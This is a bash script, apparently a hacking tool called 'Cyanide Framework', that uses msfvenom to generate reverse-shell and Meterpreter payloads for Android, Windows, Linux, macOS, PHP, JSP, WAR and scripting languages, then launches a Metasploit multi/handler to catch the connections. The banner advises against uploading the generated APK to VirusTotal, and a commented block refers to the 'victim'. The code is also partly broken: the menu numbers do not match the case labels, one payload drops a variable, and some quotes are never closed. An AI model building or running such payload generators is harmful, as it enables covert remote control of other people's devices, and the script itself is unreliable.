#!/usr/bin/env bash

resize -s 70 75 > /dev/null 

#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
# Check root
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
clear
# check internet 
function checkinternet() 
{
  ping -c 1 google.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow " Checking For Internet: ${RedF}FAILED"
    echo
    echo -e $red "This Script Needs An Active Internet Connection"
    echo
    echo -e $yellow " Cyanide-Framework Exit"
    echo && sleep 2
    exit
  else
    echo -e $yellow " Checking For Internet: ${LighGreenF}CONNECTED"
  fi
}
checkinternet

#check OS
echo -e $blue
sudo cat /etc/issue.net

#check if xterm is installed
echo ""
echo "® Checking dependencies configuration ®" 
echo "---------------------------------------"
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ found ]"
which xterm > /dev/null 2>&1
sleep 2
else
echo -e $red "[ X ] xterm -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Xterm "
sleep 2
echo -e $green ""
sudo apt-get install xterm -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which xterm > /dev/null 2>&1
fi
sleep 0.05
#which msfconsole > /dev/null 2>&1
#if [ "$?" -eq "0" ]; then
#echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
#which msfconsole > /dev/null 2>&1
#sleep 2
#else
#echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
#echo -e $yellow "[ ! ] Installing Metasploit-Framework "
#sudo apt-get install metasploit-framework -y
#echo -e $blue "[ ✔ ] Done installing ...."
#which msfconsole > /dev/null 2>&1
#fi

pwd=$(pwd)

dlhost=$(hostname -I)

# Root Permission
#if [[ "$(whoami)" != root ]]; then
#echo "You are not a root User "
#exit 1
#fi
echo -e $red "╔────────────────────────────────────────────────╗"
echo -e $red "|   Cyanide Framework For generating Payload     |"
echo -e $red "|  [ x ] Do not upload the generated APK  [ x ]  |"
echo -e $red "|               to VirusTotal.com   |"           
echo -e $red "┖────────────────────────────────────────────────┙"

echo -e $red " 1. Android               3. Windows"
echo -e $red " 2. Linux                 4. MAC"
echo -e $red " 5. PHP                   6. JSP"
echo -e $red " 7. WAR                   8. BASH"
echo -e $red " 9. Python               10. Perl"
echo -e $red "11. Linux Shell          12. Windows Shell"
echo -e $red "13. Mac Shell"
echo -e $red    "..............................."
echo -e $yellow "Please select the Payload Type:"

#Checking User Input
re='[a-zA-Z]'
 echo -e $GreenF "..............................."
 read -p " Select Payload : " Number
 if [ $Number -gt 13 ] || [ $Number -lt 1 ] || [[ "$Number" =~ $re ]];
  then
   echo -e $red    "[ x ].......................................[ x ]"
   echo -e $RedF "You choose invalid option Please try again."
   echo -e $yellow "[*] Thanks For using Cyanide-Framework  :)"
   sleep 0.02
   exit 1   
 fi
echo -e $blue "[*]....................................[*]"
echo " Do you want to use your default local host?"
read -p " Yes?No : " lhost
case $lhost in
yes|Yes|YES|Y|y)
echo -e $GreenF "[*]....................................[*]"
echo " Grabbing you default Local Host."
sleep 0.05
lhost=$(hostname -I)
;;

NO|No|N|n|no)
echo -e $GreenF "[*]....................................[*]"
echo -e $blue "Please enter your Local Host"
read -p " Enter Lhost : " lhost
;;
esac
echo -e $GreenF "[*]....................................[*]"
echo " Your local host is= $lhost"
echo -e $GreenF "[*]....................................[*]"
echo -e $blue "Enter your Local Port"
read -p " Enter Lport : " lport
echo -e $GreenF "[*]....................................[*]"
echo " Please enter the name of the file without extension like (.apk/.exe/.sh)"
read -p " Filename : " filename

case $Number in 
 Android|android|1) 
  echo -e $GreenF "[*]....................................[*]"
  echo " Please wait we are generating the payload"
  echo -e $GreenF "[ ✔ ]....................................[ ✔ ]"
  echo " Here your Local host is $lhost"
  msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" R  > $pwd/$filename.apk
  payload=android/meterpreter/reverse_tcp
  echo -e $cyan "[ ✔ ]....................................[ ✔ ]"
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  Windows|windows|W|w|2)
  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > $pwd/$filename.exe
  payload=windows/meterpreter/reverse_tcp
  echo -e $LighGreenF " Your Payload has been generated successfully in $pwd directory"
  ;;
 
  Linux|linux|L|l|3)
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > $pwd/$filename.elf
  payload=linux/x86/meterpreter/reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  MAC|mac|M|m|4)
  msfvenom -p osx/x86/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f macho > $pwd/$filename.macho
  payload=osx/x86/shell_reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
 ;;
  
  PHP|php|P|p|5)
  msfvenom -p php/meterpreter_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > $pwd/$filename.php
  payload=php/meterpreter_reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  JSP|Java|jsp|J|j|6)
  msfvenom -p java/jsp_shell_reverse_tcp LHOST="lhost" LPORT="$lport" -f raw > $pwd/$filename.jsp 
  payload=java/jsp_shell_reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  WAR|war|W|w|7)
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war > $pwd/$filename.war
  payload=java/jsp_shell_reverse_tcp
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  BASH|bash|sh|B|b|8)
  msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > $pwd/$filename.sh
  payload=cmd/unix/reverse_bash
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;
 
  Python|python|py|Py|9)
  msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > $pwd/$filename.py
  payload=cmd/unix/reverse_python
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  Perl|perl|Pl|pl|10)
  msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > $pwd/$filename.pl
  payload=cmd/unix/reverse_perl
  echo " Your Payload has been generated successfully in $pwd directory"
  ;;

  Linuxhell|linuxshellcode|11)
  read -p "Language: " language
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f $language
  payload=linux/x86/meterpreter/reverse_tcp
  echo " Your Payload has been generated successfully."
  ;;
  
  Winshell|winshell|WS|ws|12)
  read -p "Language : " language
  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f $language 
  payload=windows/meterpreter/reverse_tcp
  echo " Your Payload has been generated successfully.
  ;;

  Macshell|macshell|MS|ms|13)
  read -p "Language" language
  msfvenom -p osx/x86/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f $language
  payload=osx/x86/shell_reverse_tcp
  echo -e $GreenF "[*]....................................[*]"
  echo -e $cyan " Your Payload has been generated successfully.
  ;;

  *)
  echo -e $RedF "[x]................................................[x]"
  echo " You have choosen a wrong option Please choose a wite keyword"
esac
###########################################################
#For Setting UP loacl server
#echo "Are you and your victim on same network?"
#read -p "Yes/No??" newans
#case $newans in
#yes|Yes|YES|Y|y)
#sleep 0.5
#xterm -T "Setting up Local Server" -fa monaco -fs 10 -bg black -e "python -m SimpleHTTPServer"
#;;
#esac



#########################################################
echo -e $GreenF "[*]................................[*]"
echo " Do you want to open msfconsole?"
read -p " Yes/No? " answer

#case $answer in 

#yes|Yes|YES|Y|y)

#which msfconsole >  /dev/null 2>&1
#if[ "$?" -eq 0 ];
#then
#echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
#which msfconsole > /dev/null 2>&1
#else
#echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
#echo -e $yellow "[ ! ] Installing Metasploit-Framework "
#sudo apt-get install metasploit-framework -y
#echo -e $blue "[ ✔ ] Done installing ...."
#which msfconsole > /dev/null 2>&1
#sleep 2
#fi
#echo " Opening Metasploit"
#sleep 0.05
#xterm -T "CYANIDE MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'"
#;;

#No|NO|no|N|n)
#echo "Thank You for Using Cyanide Framework"
#;;
#esac



if [[ $answer == "YES" ||  $answer == "Yes" ||  $answer == "yes" ||  $answer == "Y" ||  $answer == "y" ]]; then
which msfconsole > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
 which msfconsole > /dev/null 2>&1
 sleep 2
 else
  echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
  echo -e $yellow "[ ! ] Installing Metasploit-Framework "
  sudo apt-get install metasploit-framework -y
  echo -e $blue "[ ✔ ] Done installing ...."
  which msfconsole > /dev/null 2>&1
 fi
 sleep 1
 echo " Opening Metasploit"
 sleep 0.05
 xterm -T "CYANIDE MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'"
elif [[ $answer == "NO" ||  $answer == "No" ||  $answer == "no" ||  $answer == "N" ||  $answer == "n" ]]; then
 echo -e $GreenF "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 echo "Thanks for using Cyanide Framework"

else
 echo -e $RedF "[ X ]....................................[ X ]"
 echo "Wrong option please try again"
fi




